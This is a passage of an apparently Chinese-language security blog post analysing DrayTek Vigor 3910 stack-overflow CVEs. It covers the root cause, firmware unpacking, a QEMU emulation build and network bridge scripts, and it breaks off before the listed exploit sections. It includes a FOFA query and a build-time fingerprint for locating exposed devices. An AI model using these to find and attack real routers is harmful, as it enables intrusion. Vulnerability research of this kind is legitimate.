<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="CVE-2024-41592漏洞描述漏洞描述：通过向Web UI的40多个CGI页面中的任何一个发送一个很长的查询字符串来触发，使用许多 “&amp;”字符来分隔查询字符串参数 漏洞组件：sohod64.bin 漏洞类型：未授权栈溢出 影响范围：EoL（End of Life 停止维护）版本仅包含CVE-2024-41592的修复程序，Fixed Versions代表漏洞修复的版本  漏洞分析固件">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2024-41592&#x2F;41585 DrayTek 栈溢出">
<meta property="og:url" content="http://example.com/2024/11/05/2024-11-05-CVE-2024-4159241585%20DrayTek%20%E6%A0%88%E6%BA%A2%E5%87%BA/index.html">
<meta property="og:site_name" content="k0mor3b1">
<meta property="og:description" content="CVE-2024-41592漏洞描述漏洞描述：通过向Web UI的40多个CGI页面中的任何一个发送一个很长的查询字符串来触发，使用许多 “&amp;”字符来分隔查询字符串参数 漏洞组件：sohod64.bin 漏洞类型：未授权栈溢出 影响范围：EoL（End of Life 停止维护）版本仅包含CVE-2024-41592的修复程序，Fixed Versions代表漏洞修复的版本  漏洞分析固件">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/images/image-20250223171214702.png">
<meta property="og:image" content="http://example.com/images/jR6SWMwUGJkbjRmXzE3.png">
<meta property="og:image" content="http://example.com/images/wYjdjMGYzOGYwY2J.png">
<meta property="og:image" content="http://example.com/images/hMnhmbnlqS0ZIZWduY2ExWmdvTF.png">
<meta property="og:image" content="http://example.com/images/EFNUGhUczFxTU9nZkpfVG9.png">
<meta property="og:image" content="http://example.com/images/AzMDE4ODI6MTc0MDMwNTQ4Ml.png">
<meta property="og:image" content="http://example.com/images/Y2I4NGIzNWVlZWFjOWY2MmMwM.png">
<meta property="og:image" content="http://example.com/images/image-20250223171527934.png">
<meta property="og:image" content="http://example.com/images/image-20250223171542730.png">
<meta property="og:image" content="http://example.com/images/FhYTQ1YjVfa3hqYlduRTN1RU16YnU3akhxazNCNURvdHdIdGZyYzZfVG9rZW46VnRxamJJaUZYb1pXZGh4dVdNOGNZandXbndmXzE3NDAzMDE4ODI6MTc0.png">
<meta property="og:image" content="http://example.com/images/hIZnl4VWFtY2NCbkpvbjFmXzE3NDAzMDE4ODI6MTc0MDMwNTQ4Ml9WNA.png">
<meta property="og:image" content="http://example.com/images/DAzMDE4ODI6MTc0MDMwNTQ4Ml9WNA.png">
<meta property="og:image" content="http://example.com/images/VjOTExYzUyODA0NzU1YjJfcjlkblNRNnp.png">
<meta property="og:image" content="http://example.com/images/MDE4ODI6MTc0MDMwNTQ4Ml9WNA.png">
<meta property="og:image" content="http://example.com/images/xMGUxYzQ3NTlfTUNWYXFCV2hBOTNSVjRTeEYwNHE4akIxbk.png">
<meta property="og:image" content="http://example.com/images/MzlfWjVJTENCQ3lnY2FJdjlsU21neFdBSmtTMmJHN2pYNHNfVG9rZW46VzJQZGJDN0tib01JNm14OEtkZ2NtU1p0bjJkXzE3NDAzMDE4ODI6MTc0MDMw.png">
<meta property="og:image" content="http://example.com/images/l9WNA.png">
<meta property="og:image" content="http://example.com/images/NkblpkXzE3NDAzMDE4ODI6MTc0MDMwNTQ4Ml9WNA.png">
<meta property="og:image" content="http://example.com/images/2YzNTJfUHBsN1A0UXR4N2hJbXI1M2hUcWJVOHFHVThCaXp4UmpfVG9rZW46T25TVmJOU1Y4b3doUHV4Z2dHMWNQeHV6bjJlXzE3NDAzM.png">
<meta property="og:image" content="http://example.com/images/image-20250223171908085.png">
<meta property="og:image" content="http://example.com/images/wNTQ4Ml9WNA.png">
<meta property="og:image" content="http://example.com/images/image-20250223171943112.png">
<meta property="og:image" content="http://example.com/images/3NDAzMDE4ODI6MTc0MDMwNTQ4Ml9WNA55.png">
<meta property="og:image" content="http://example.com/images/image-20250223172016648.png">
<meta property="og:image" content="http://example.com/images/gxNTkzYzlfZGdDcnFnTDVFc1praTNwWVhYUlRYeEpvemJ5OElRb1BfVG9rZW46UFUwYWJSb2hZb1doOWN4NWVxaWNDUExv.png">
<meta property="og:image" content="http://example.com/images/MTRhNzRfbWt0Y1RBU0.png">
<meta property="og:image" content="http://example.com/images/MTc0MDM36.png">
<meta property="og:image" content="http://example.com/images/mE1MTFkZWIyMTk0N2RfN2p36.png">
<meta property="og:image" content="http://example.com/images/zNiOGY4ZTgxMWZfYzFJUHZ4RWV54.png">
<meta property="og:image" content="http://example.com/images/image-20250223172504121.png">
<meta property="og:image" content="http://example.com/images/Ta3JSbnVlXzE3NDAzMDE4ODI6MTc0MDMwNTQ4.png">
<meta property="og:image" content="http://example.com/images/Ta3JSbnVlXzE3NDAzMDE4ODI6MTc0MDMwNTQ425.png">
<meta property="og:image" content="http://example.com/images/Ta3JSbnVlXzE3NDAzMDE4ODI6MTc0MDMwNTQ4369.png">
<meta property="og:image" content="http://example.com/images/Ta3JSbnVlXzE3NDAzMDE4ODI6MTc0MDMwNTQ42541.png">
<meta property="og:image" content="http://example.com/images/Ta3JSbnVlXzE3NDAzMDE4ODI6MTc0MDMwNTQ41234.png">
<meta property="og:image" content="http://example.com/images/Ta3JSbnVlXzE3NDAzMDE4ODI6MTc0MDMwNTQ412345.png">
<meta property="article:published_time" content="2024-11-05T00:00:00.000Z">
<meta property="article:modified_time" content="2025-02-23T10:36:30.851Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/image-20250223171214702.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>CVE-2024-41592/41585 DrayTek 栈溢出</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/k0mor3b1">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/11/23/2024-11-23-CVE-2024-39226%20GL-iNet%20%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/11/01/2024-11-01-nodejs-%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/11/05/2024-11-05-CVE-2024-4159241585%20DrayTek%20%E6%A0%88%E6%BA%A2%E5%87%BA/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/11/05/2024-11-05-CVE-2024-4159241585%20DrayTek%20%E6%A0%88%E6%BA%A2%E5%87%BA/&text=CVE-2024-41592/41585 DrayTek 栈溢出"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/11/05/2024-11-05-CVE-2024-4159241585%20DrayTek%20%E6%A0%88%E6%BA%A2%E5%87%BA/&title=CVE-2024-41592/41585 DrayTek 栈溢出"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/11/05/2024-11-05-CVE-2024-4159241585%20DrayTek%20%E6%A0%88%E6%BA%A2%E5%87%BA/&is_video=false&description=CVE-2024-41592/41585 DrayTek 栈溢出"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2024-41592/41585 DrayTek 栈溢出&body=Check out this article: http://example.com/2024/11/05/2024-11-05-CVE-2024-4159241585%20DrayTek%20%E6%A0%88%E6%BA%A2%E5%87%BA/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/11/05/2024-11-05-CVE-2024-4159241585%20DrayTek%20%E6%A0%88%E6%BA%A2%E5%87%BA/&title=CVE-2024-41592/41585 DrayTek 栈溢出"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/11/05/2024-11-05-CVE-2024-4159241585%20DrayTek%20%E6%A0%88%E6%BA%A2%E5%87%BA/&title=CVE-2024-41592/41585 DrayTek 栈溢出"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/11/05/2024-11-05-CVE-2024-4159241585%20DrayTek%20%E6%A0%88%E6%BA%A2%E5%87%BA/&title=CVE-2024-41592/41585 DrayTek 栈溢出"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/11/05/2024-11-05-CVE-2024-4159241585%20DrayTek%20%E6%A0%88%E6%BA%A2%E5%87%BA/&title=CVE-2024-41592/41585 DrayTek 栈溢出"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/11/05/2024-11-05-CVE-2024-4159241585%20DrayTek%20%E6%A0%88%E6%BA%A2%E5%87%BA/&name=CVE-2024-41592/41585 DrayTek 栈溢出&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/11/05/2024-11-05-CVE-2024-4159241585%20DrayTek%20%E6%A0%88%E6%BA%A2%E5%87%BA/&t=CVE-2024-41592/41585 DrayTek 栈溢出"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2024-41592"><span class="toc-number">1.</span> <span class="toc-text">CVE-2024-41592</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.3.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc-exp"><span class="toc-number">1.4.</span> <span class="toc-text">poc&#x2F;exp</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PoC"><span class="toc-number">1.4.1.</span> <span class="toc-text">PoC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-number">1.4.2.</span> <span class="toc-text">EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%87%87%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B8%80%EF%BC%9A%EF%BC%88%E4%B8%8D%E9%80%9A%EF%BC%89"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">采用思路一：（不通）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%87%87%E7%94%A8%E6%80%9D%E8%B7%AF%E4%BA%8C%EF%BC%9A"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">采用思路二：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4EXP"><span class="toc-number">1.4.3.</span> <span class="toc-text">完整EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="toc-number">1.5.</span> <span class="toc-text">补丁分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.6.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%80%9C%E9%94%AE%E2%80%9D%E9%87%8A%E6%94%BE%E9%97%AE%E9%A2%98"><span class="toc-number">1.6.1.</span> <span class="toc-text">“键”释放问题</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2024-41585"><span class="toc-number">2.</span> <span class="toc-text">CVE-2024-41585</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-1"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B4%E4%BD%93%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">2.2.1.</span> <span class="toc-text">整体分析：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">2.2.2.</span> <span class="toc-text">细节分析：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">2.3.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        CVE-2024-41592/41585 DrayTek 栈溢出
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">John Doe</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-11-05T00:00:00.000Z" class="dt-published" itemprop="datePublished">2024-11-05</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="CVE-2024-41592"><a href="#CVE-2024-41592" class="headerlink" title="CVE-2024-41592"></a>CVE-2024-41592</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>漏洞描述：通过向Web UI的40多个CGI页面中的任何一个发送一个很长的查询字符串来触发，使用许多 “&amp;”字符来分隔查询字符串参数</p>
<p>漏洞组件：sohod64.bin</p>
<p>漏洞类型：未授权栈溢出</p>
<p>影响范围：EoL（End of Life 停止维护）版本仅包含CVE-2024-41592的修复程序，Fixed Versions代表漏洞修复的版本</p>
<p><img src="/images/image-20250223171214702.png" alt="image-20250223171214702"></p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>固件版本：<code>Vigor3910_v3.9.7.2</code></p>
<p>fofa：<code>&quot;Vigor 3910&quot; &amp;&amp; title==&quot;Vigor Login Page&quot;</code></p>
<p>标志：<code>var buildtime=&quot;Dec 21 2021 17:26:18&quot;;</code></p>
<p>获取用户<code>get</code>请求的数据，没有限制长度循环给<code>a2</code>赋值导致溢出漏洞</p>
<p><img src="/images/jR6SWMwUGJkbjRmXzE3.png" alt="img"></p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>本机环境</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">win10：<span class="number">192.168</span><span class="number">.1</span><span class="number">.10</span></span><br><span class="line">ubuntu20<span class="number">.04</span>：<span class="number">192.168</span><span class="number">.2</span><span class="number">.156</span> net模式</span><br><span class="line">网关：<span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span></span><br><span class="line">固件版本：Vigor3910_v3<span class="number">.9</span><span class="number">.7</span><span class="number">.2</span></span><br></pre></td></tr></table></figure>

<p>固件解包</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@key:/home/key/Desktop/<span class="number">3910</span>/cpio-root# ll</span><br><span class="line">total <span class="number">100</span></span><br><span class="line">drwxr-xr-x <span class="number">23</span> root root <span class="number">4096</span> <span class="number">10</span>月  <span class="number">9</span> <span class="number">11</span>:<span class="number">26</span> ./</span><br><span class="line">drwxr-xr-x  <span class="number">3</span> root root <span class="number">4096</span> <span class="number">10</span>月  <span class="number">9</span> <span class="number">11</span>:<span class="number">29</span> ../</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> root root <span class="number">4096</span> <span class="number">10</span>月  <span class="number">9</span> <span class="number">11</span>:<span class="number">26</span> bin/</span><br><span class="line">drwxr-xr-x  <span class="number">3</span> root root <span class="number">4096</span> <span class="number">10</span>月  <span class="number">9</span> <span class="number">11</span>:<span class="number">26</span> dev/</span><br><span class="line">drwxr-xr-x  <span class="number">3</span> root root <span class="number">4096</span> <span class="number">10</span>月  <span class="number">9</span> <span class="number">11</span>:<span class="number">26</span> draytek/</span><br><span class="line">drwxr-xr-x  <span class="number">8</span> root root <span class="number">4096</span> <span class="number">10</span>月  <span class="number">9</span> <span class="number">11</span>:<span class="number">26</span> etc/</span><br><span class="line">drwxr-xr-x  <span class="number">3</span> root root <span class="number">4096</span> <span class="number">10</span>月  <span class="number">9</span> <span class="number">11</span>:<span class="number">26</span> firmware/</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> root root <span class="number">4096</span> <span class="number">10</span>月  <span class="number">9</span> <span class="number">11</span>:<span class="number">26</span> home/</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> root root <span class="number">4096</span> <span class="number">10</span>月  <span class="number">9</span> <span class="number">11</span>:<span class="number">26</span> include/</span><br><span class="line">-rw-r<span class="comment">--r--  1 root root   10 10月  9 11:20 init</span></span><br><span class="line">drwxr-xr-x  <span class="number">5</span> root root <span class="number">4096</span> <span class="number">10</span>月  <span class="number">9</span> <span class="number">11</span>:<span class="number">26</span> lib/</span><br><span class="line">drwxr-xr-x  <span class="number">3</span> root root <span class="number">4096</span> <span class="number">10</span>月  <span class="number">9</span> <span class="number">11</span>:<span class="number">26</span> lib64/</span><br><span class="line">-rw-r<span class="comment">--r--  1 root root   12 10月  9 11:20 linuxrc</span></span><br><span class="line">drwxr-xr-x  <span class="number">2</span> root root <span class="number">4096</span> <span class="number">10</span>月  <span class="number">9</span> <span class="number">11</span>:<span class="number">26</span> lost+found/</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> root root <span class="number">4096</span> <span class="number">10</span>月  <span class="number">9</span> <span class="number">11</span>:<span class="number">26</span> mnt/</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> root root <span class="number">4096</span> <span class="number">10</span>月  <span class="number">9</span> <span class="number">11</span>:<span class="number">26</span> mnth/</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> root root <span class="number">4096</span> <span class="number">10</span>月  <span class="number">9</span> <span class="number">11</span>:<span class="number">26</span> proc/</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> root root <span class="number">4096</span> <span class="number">10</span>月  <span class="number">9</span> <span class="number">11</span>:<span class="number">26</span> root/</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> root root <span class="number">4096</span> <span class="number">10</span>月  <span class="number">9</span> <span class="number">11</span>:<span class="number">26</span> sbin/</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> root root <span class="number">4096</span> <span class="number">10</span>月  <span class="number">9</span> <span class="number">11</span>:<span class="number">26</span> share/</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> root root <span class="number">4096</span> <span class="number">10</span>月  <span class="number">9</span> <span class="number">11</span>:<span class="number">26</span> sys/</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> root root <span class="number">4096</span> <span class="number">10</span>月  <span class="number">9</span> <span class="number">11</span>:<span class="number">26</span> testfunc/</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> root root <span class="number">4096</span> <span class="number">10</span>月  <span class="number">9</span> <span class="number">11</span>:<span class="number">26</span> tmp/</span><br><span class="line">drwxr-xr-x  <span class="number">8</span> root root <span class="number">4096</span> <span class="number">10</span>月  <span class="number">9</span> <span class="number">11</span>:<span class="number">26</span> usr/</span><br><span class="line">drwxr-xr-x  <span class="number">5</span> root root <span class="number">4096</span> <span class="number">10</span>月  <span class="number">9</span> <span class="number">11</span>:<span class="number">26</span> var/</span><br></pre></td></tr></table></figure>

<p>检查 <code>firmware </code>目录下的启动脚本<code>run_linux.sh</code>，发现 <code>qemu </code>启动时存在一个非标准参数 <code>-dtb DrayTek</code>，猜测是开发者修改过 <code>QEMU </code>源代码，自行添加的参数。</p>
<p><img src="/images/wYjdjMGYzOGYwY2J.png" alt="img"></p>
<p><code>Draytek </code>提供设备的 <code>GPL </code><a target="_blank" rel="noopener" href="https://gplsource.draytek.com/?dir=">代码</a>，下载 <code>3910 </code>型号的 <code>GPL </code>代码分析确定，开发者为 <code>QEMU </code>添加了一些新功能，用来支持 <code>drayos </code>运行，所以我们需要编译这份 <code>GPL </code>代码。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">解压GPL</span><br><span class="line">tar -xvjf new_v3910_v396_GPL_release.tar.bz2</span><br><span class="line">找到qemu源码，然后解压编译</span><br><span class="line">tar -xvjf qemu-<span class="number">2.12</span><span class="number">.1</span>.tar.bz2</span><br><span class="line">./configure --enable-kvm --enable-debug --target-<span class="built_in">list</span>=aarch64-softmmu</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<p>编译好之后得到需要的 <code>qemu-system-aarch64</code>，接下来要修改原始的启动脚本，适配本地环境。</p>
<p>将编译完成<code>qemu-system-aarch64</code>拷贝到固件解包的文件系统中，目标路径<code>cpio-root/firmware</code></p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@key:/home/key/Desktop/<span class="number">3910</span>/Vigor3910_v396_GPL_release/source/linux/cavium-rootfs/src_dir/qemu<span class="number">-2.12</span><span class="number">.1</span># <span class="built_in">find</span> | grep qemu-system-aarch64</span><br><span class="line">./aarch64-softmmu/qemu-system-aarch64</span><br><span class="line"></span><br><span class="line">root@key:/home/key/Desktop/<span class="number">3910</span>/cpio-root/firmware# cp ../../Vigor3910_v396_GPL_release/source/linux/cavium-rootfs/src_dir/qemu<span class="number">-2.12</span><span class="number">.1</span>/aarch64-softmmu/qemu-system-aarch64 .</span><br></pre></td></tr></table></figure>

<p>宿主机需要新添加两张网卡，修改 <code>network.sh</code> 脚本，将网卡名称替换到脚本中</p>
<p>创建网卡，配置<code>IP</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo tunctl -t ens38 -u root</span><br><span class="line">sudo ifconfig ens38 <span class="number">192.168</span><span class="number">.1</span><span class="number">.10</span>/<span class="number">24</span></span><br><span class="line">sudo tunctl -t ens39 -u root</span><br><span class="line">sudo ifconfig ens39 <span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p>在路径<code>cpio-root/firmware</code>创建<code>network.sh</code>和<code>myrun.sh</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">iflan=ens38</span><br><span class="line">ifwan=ens39</span><br><span class="line">mylanip=<span class="string">&quot;192.168.1.10&quot;</span></span><br><span class="line"></span><br><span class="line">brctl delbr br-lan</span><br><span class="line">brctl delbr br-wan</span><br><span class="line"></span><br><span class="line">ip link add br-lan <span class="built_in">type</span> bridge</span><br><span class="line">ip tuntap add qemu-lan mode tap</span><br><span class="line">brctl addif br-lan $iflan</span><br><span class="line">brctl addif br-lan qemu-lan</span><br><span class="line">ip addr flush dev $iflan</span><br><span class="line">ifconfig br-lan $mylanip</span><br><span class="line">ifconfig br-lan up</span><br><span class="line">ifconfig qemu-lan up</span><br><span class="line">ifconfig $iflan up</span><br><span class="line"></span><br><span class="line">ip link add br-wan <span class="built_in">type</span> bridge</span><br><span class="line">ip tuntap add qemu-wan mode tap</span><br><span class="line">brctl addif br-wan $ifwan</span><br><span class="line">brctl addif br-wan qemu-wan</span><br><span class="line">ip addr flush dev $ifwan</span><br><span class="line">ifconfig br-lan $mylanip</span><br><span class="line">ifconfig br-wan up</span><br><span class="line">ifconfig qemu-wan up</span><br><span class="line">ifconfig $ifwan up</span><br><span class="line"></span><br><span class="line">brctl show</span><br><span class="line"></span><br><span class="line"><span class="comment">#for speed test</span></span><br><span class="line">ethtool -K $iflan gro off</span><br><span class="line">ethtool -K $iflan gso off</span><br><span class="line"></span><br><span class="line">ethtool -K $ifwan gro off</span><br><span class="line">ethtool -K $ifwan gso off</span><br><span class="line"></span><br><span class="line">ethtool -K qemu-lan gro off</span><br><span class="line">ethtool -K qemu-lan gso off</span><br><span class="line"></span><br><span class="line">ethtool -K qemu-wan gro off</span><br><span 